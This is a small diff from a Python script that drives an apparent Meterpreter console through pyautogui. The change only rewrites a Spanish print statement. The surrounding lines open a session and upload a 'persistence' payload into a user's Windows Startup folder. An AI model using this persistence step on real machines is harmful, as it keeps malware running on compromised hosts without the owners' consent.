@@ -519,8 +519,9 @@ if numero == 4:
                        
              pyautogui.write("sessions " + sessions +"")
              pyautogui.press("ENTER")
-             print("COPIE ESTE COMANDO PARA SEGUIR CON EL PROCESO 
-                   > cd C:\Users\practicas.ist\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+             print(""" COPIE ESTE COMANDO PARA SEGUIR CON EL PROCESO 
+                   > cd C:\Users\practicas.ist\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+		   """)
              
              
              pyautogui.write("upload " + path_payload_pers +"")
